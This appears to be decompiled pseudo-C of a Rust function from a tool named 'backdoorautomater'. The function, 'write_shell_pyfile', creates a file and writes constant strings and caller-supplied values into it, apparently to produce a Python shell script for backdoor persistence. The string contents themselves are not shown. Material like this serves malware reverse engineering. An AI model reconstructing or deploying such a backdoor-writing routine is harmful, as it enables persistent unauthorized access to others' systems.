long _ZN17backdoorautomater13modifyservice18write_shell_pyfile17hce4cf953ddafe0d0E
               (long param_1,long param_2)

{
  long lVar1;
  int local_8c;
  undefined8 local_88;
  long local_80;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 local_68;
  undefined4 uStack_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined8 local_58;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined8 local_38;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined8 local_20;
  
                    /* try { // try from 001554a2 to 001554b7 has its CatchHandler @ 0015576e */
  _ZN3std2fs4File6create17hf69a1aea5d21dd7bE(&local_88,&DAT_00265ed7,0x12);
  lVar1 = local_80;
  if ((int)local_88 == 0) {
    local_8c = local_88._4_4_;
                    /* try { // try from 001554d1 to 0015554f has its CatchHandler @ 0015575b */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265ee9,0x1d);
    if ((lVar1 == 0) &&
       (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265f06,0x34),
       lVar1 == 0)) {
      local_78 = *(undefined4 *)(param_2 + 8);
      uStack_74 = *(undefined4 *)(param_2 + 0xc);
      uStack_70 = *(undefined4 *)(param_2 + 0x10);
      uStack_6c = *(undefined4 *)(param_2 + 0x14);
      local_88 = &DAT_00265f3a;
      local_80 = 6;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
      local_58 = local_20;
      local_68 = local_30;
      uStack_64 = uStack_2c;
      uStack_60 = uStack_28;
      uStack_5c = uStack_24;
                    /* try { // try from 00155564 to 001555d3 has its CatchHandler @ 0015574c */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                (&local_68,&DAT_00265a9c,3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_8c,CONCAT44(uStack_5c,uStack_60),local_58);
      if (lVar1 == 0) {
        local_78 = *(undefined4 *)(param_1 + 8);
        uStack_74 = *(undefined4 *)(param_1 + 0xc);
        uStack_70 = *(undefined4 *)(param_1 + 0x10);
        uStack_6c = *(undefined4 *)(param_1 + 0x14);
        local_88 = &DAT_00265030;
        local_80 = 0x10;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
        local_38 = local_20;
        local_48 = local_30;
        uStack_44 = uStack_2c;
        uStack_40 = uStack_28;
        uStack_3c = uStack_24;
                    /* try { // try from 001555e8 to 001556cd has its CatchHandler @ 0015573d */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                  (&local_48,&DAT_00265a9f,4);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_8c,CONCAT44(uStack_3c,uStack_40),local_38);
        if ((((lVar1 == 0) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265f40,0x17),
             lVar1 == 0)) &&
            (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265f57,0x17),
            lVar1 == 0)) &&
           (((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265f6e,0x17),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265f85,0x1e),
             lVar1 == 0)) &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265fa3,0x14),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265fb7,0x31),
             lVar1 == 0)))))) {
                    /* try { // try from 00155713 to 0015571c has its CatchHandler @ 0015574c */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
                    /* try { // try from 0015571d to 00155726 has its CatchHandler @ 0015575b */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
                    /* try { // try from 0015572b to 0015572f has its CatchHandler @ 0015576e */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
                    /* try { // try from 00155730 to 00155737 has its CatchHandler @ 00155769 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_001556fb;
        }
                    /* try { // try from 001556d6 to 001556df has its CatchHandler @ 0015574c */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
      }
                    /* try { // try from 001556e0 to 001556e9 has its CatchHandler @ 0015575b */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
    }
                    /* try { // try from 001556ee to 001556f2 has its CatchHandler @ 0015576e */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
  }
                    /* try { // try from 001556f3 to 001556fa has its CatchHandler @ 00155769 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_001556fb:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}